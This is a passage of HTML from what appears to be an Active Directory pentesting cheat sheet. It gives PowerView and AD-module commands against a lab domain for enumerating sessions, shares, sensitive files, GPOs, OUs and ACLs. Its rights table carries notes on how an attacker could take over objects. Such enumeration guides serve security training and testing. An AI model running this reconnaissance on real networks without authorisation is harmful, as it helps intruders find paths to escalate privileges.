&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-ListGroups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">: cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net localgroup
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all effective local/domain users/groups that can access the machine with local administrative privileges:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLocalGroup&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get currently logged users on a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetLoggedon&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get active sessions on the host:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get currently locally logged users on a computer (need remote registry - default in server OS):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LoggedOnLocal&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LoggedOnLocal&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the last logged user on a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-LastLoggedOn&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>List RDP sessions inside a computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetRDPSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find shares on host in current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-ExcludeStandard&lt;/span> &lt;span class="n">-ExcludePrint&lt;/span> &lt;span class="n">-ExcludeIPC&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Check if the share is accessible&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-CheckShareAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find senstive files on computers in the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-FileFinder&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all fileservers of the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetFileServer&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of GPO in current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">displayname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">whencreated&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-GPOname&lt;/span> &lt;span class="s2">&amp;#34;{AB306569-220D-43FF-B03B83E8F4EF8081}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>GPO files are stored in the SYSVOL path:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd &lt;/span>&lt;span class="s2">&amp;#34;\\cyberlab.local\sysvol\cyberlab.local\Policies\{603ABE02-C554-49B1-A462-2FF89BC61CB2}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>and can be easily analized by using the tool &lt;em>Registry.Pol Reader&lt;/em>. It is necessary to copy the folder to the local machine and then open the file &lt;em>registry.pol&lt;/em> in the aforementioned tool. In case it is possible to install such tool on a machine in the analyzed domain, it can automatically capture and show all the policies.&lt;/p>
&lt;p>Get GPO(s) which use Restricted Groups or groups.xml for interesting users:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPOGroup&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get users/groups which are in a local group of a machine using GPO correlation (this command analyzes the GPO applied to the OU to which the computer belongs):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="c"># Default group: Local Administrators&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-LocalGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">GPODisplayName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">isGroup&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IsGroup&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOComputerAdmin&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1.cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IsGroup&lt;/span> &lt;span class="o">-ne&lt;/span> &lt;span class="vm">$true&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">GPODisplayName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get machines where the given user is member of a specific group using GPO correlation:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="c"># Default group: Local administrators&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-LocalGroup&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-GPOLocation&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get OUs in a domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="n">-FullData&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">gplink&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all the computers in all OUs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;---&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all the computers in an OU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="s2">&amp;#34;*student*&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Enumerate all GPOs applied to an OU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">*&lt;/span>&lt;span class="n">student&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s1">&amp;#39;LDAP://cn={5BA02DB5-FC5E-4A57-A310-0B1600456CC7},cn=policies,cn=system,DC=cyberlab,DC=local&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADOrganizationalUnit&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="access-control-lists-acl">Access Control Lists (ACL)&lt;/h2>
&lt;p>&lt;strong>ACL Entities&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>SID&lt;/td>
&lt;td>Security IDentifier&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DACL&lt;/td>
&lt;td>Discretionary Access Control List&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ACE&lt;/td>
&lt;td>Access Control Entry (contained in DACL)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>SACL&lt;/td>
&lt;td>Security Access Control List (LOGS)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>ACE Structure&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>IdentityReference&lt;/td>
&lt;td>Subject&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ActiveDirectoryRights&lt;/td>
&lt;td>Privileges assigned to IdentityReference in relation to ObjectDN&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ObjectDN&lt;/td>
&lt;td>Target Object&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>IdentityReference&lt;/strong> can &lt;strong>ActiveDirectoryRights&lt;/strong> on &lt;strong>ObjectDN&lt;/strong>&lt;/p>
&lt;hr>
&lt;p>&lt;strong>ActiveDirectoryRights&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Value&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>AccessSystemSecurity&lt;/td>
&lt;td>16777216&lt;/td>
&lt;td>The right to get or set the SACL in the object security descriptor.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>CreateChild&lt;/td>
&lt;td>1&lt;/td>
&lt;td>The right to create children of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Delete&lt;/td>
&lt;td>65536&lt;/td>
&lt;td>The right to delete the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DeleteChild&lt;/td>
&lt;td>2&lt;/td>
&lt;td>The right to delete children of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>DeleteTree&lt;/td>
&lt;td>64&lt;/td>
&lt;td>The right to delete all children of this object, regardless of the permissions of the children.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ExtendedRight&lt;/td>
&lt;td>256&lt;/td>
&lt;td>A customized control access right. For a list of possible extended rights, see the topic &amp;ldquo;Extended Rights&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com" target="_blank" rel="noopener">http://msdn.microsoft.com&lt;/a>. For more information about extended rights, see the topic &amp;ldquo;Control Access Rights&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com" target="_blank" rel="noopener">http://msdn.microsoft.com&lt;/a>. [AllExtendedRights - ability to add user to a group or reset password]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ForceChangePassword&lt;/td>
&lt;td>&lt;/td>
&lt;td>Ability to change user&amp;rsquo;s password&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericAll&lt;/td>
&lt;td>983551&lt;/td>
&lt;td>The right to create or delete children, delete a subtree, read and write properties, examine children and the object itself, add and remove the object from the directory, and read or write with an extended right. [full rights to the object (add users to a group or reset user&amp;rsquo;s password)]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericExecute&lt;/td>
&lt;td>131076&lt;/td>
&lt;td>The right to read permissions on, and list the contents of, a container object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericRead&lt;/td>
&lt;td>131220&lt;/td>
&lt;td>The right to read permissions on this object, read all the properties on this object, list this object name when the parent container is listed, and list the contents of this object if it is a container.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>GenericWrite&lt;/td>
&lt;td>131112&lt;/td>
&lt;td>The right to read permissions on this object, write all the properties on this object, and perform all validated writes to this object. [update object&amp;rsquo;s attributes (i.e logon script)]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ListChildren&lt;/td>
&lt;td>4&lt;/td>
&lt;td>The right to list children of this object. For more information about this right, see the topic &amp;ldquo;Controlling Object Visibility&amp;rdquo; in the MSDN Library &lt;a href="http://msdn.microsoft.com/library" target="_blank" rel="noopener">http://msdn.microsoft.com/library&lt;/a>.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ListObject&lt;/td>
&lt;td>128&lt;/td>
&lt;td>The right to list a particular object. For more information about this right, see the topic &amp;ldquo;Controlling Object Visibility&amp;rdquo; in the MSDN Library at &lt;a href="http://msdn.microsoft.com/library" target="_blank" rel="noopener">http://msdn.microsoft.com/library&lt;/a>.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ReadControl&lt;/td>
&lt;td>131072&lt;/td>
&lt;td>The right to read data from the security descriptor of the object, not including the data in the SACL.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ReadProperty&lt;/td>
&lt;td>16&lt;/td>
&lt;td>The right to read properties of the object.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Self&lt;/td>
&lt;td>8&lt;/td>
&lt;td>The right to perform an operation that is controlled by a validated write access right. [ability to add yourself to a group]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Synchronize&lt;/td>
&lt;td>1048576&lt;/td>
&lt;td>The right to use the object for synchronization. This right enables a thread to wait until that object is in the signaled state.&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteDacl&lt;/td>
&lt;td>262144&lt;/td>
&lt;td>The right to modify the DACL in the object security descriptor. [modify object&amp;rsquo;s ACEs and give attacker full control right over the object]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteOwner&lt;/td>
&lt;td>524288&lt;/td>
&lt;td>The right to assume ownership of the object. The user must be an object trustee. The user cannot transfer the ownership to other users. [change object owner to attacker controlled user take over the object]&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WriteProperty&lt;/td>
&lt;td>32&lt;/td>
&lt;td>The right to write properties of the object.&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>Get the ACLs associated with the specified SamAccountName (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified target AD prefix or path (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=Administrator,CN=Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=FirstName LastName,CN=Users&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s2">&amp;#34;CN=FirstName LastName,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=Administrator,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated with the specified target LDAP path (ObjectDN - Target object):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSpath&lt;/span> &lt;span class="s2">&amp;#34;LDAP://CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the ACLs associated to all the GPOs:&lt;/p>
